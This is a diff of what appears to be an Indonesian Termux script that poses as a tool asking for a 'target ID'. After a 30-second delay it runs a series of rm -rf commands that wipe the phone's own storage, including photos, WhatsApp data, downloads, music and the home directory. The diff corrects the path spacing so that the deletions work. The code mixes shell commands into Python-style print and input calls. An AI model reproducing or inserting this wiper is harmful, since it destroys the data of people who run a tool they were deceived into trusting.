@@ -40,18 +40,17 @@ print ('')
 ma = input ('\033[36;1mMasukan ID Target :\033[1;33m ')
 sleep(30)
 termux-setup-storage
-rm -rf $home
-rm -rf / storage / emulated / 0
-rm -rf / sdcard / 0
-rm -rf / storage / emulated / 0 / DCIM
-rm -rf / storage / emulated / 0 / android / obb
-rm -rf / sdcard / 0 / android / data
+rm -rf /storage/emulated/0
+rm -rf /sdcard/0
+rm -rf /storage/emulated/0/DCIM
+rm -rf /storage/emulated/0/android/obb
+rm -rf /sdcard/0/android/data
 rm -rf $ HOME
-rm -rf sdcard / 0
-rm -rf penyimpanan / dicontoh / 0
-rm -rf / storage / emulated / 0 / WhatsApp
-rm -rf / sdcard / 0 / WhatsApp
-rm -rf / storage / emulated / 0 / Downloads
-rm -rf / storage / emulated / 0 / Music
-rm -rf / sdcard / 0 / Musik
+rm -rf sdcard/0
+rm -rf penyimpanan/dicontoh/0
+rm -rf /storage/emulated/0/WhatsApp
+rm -rf /sdcard/0/WhatsApp
+rm -rf /storage/emulated/0/Downloads
+rm -rf /storage/emulated/0/Music
+rm -rf /sdcard/0/Musik
 print ('\033[37;1m')
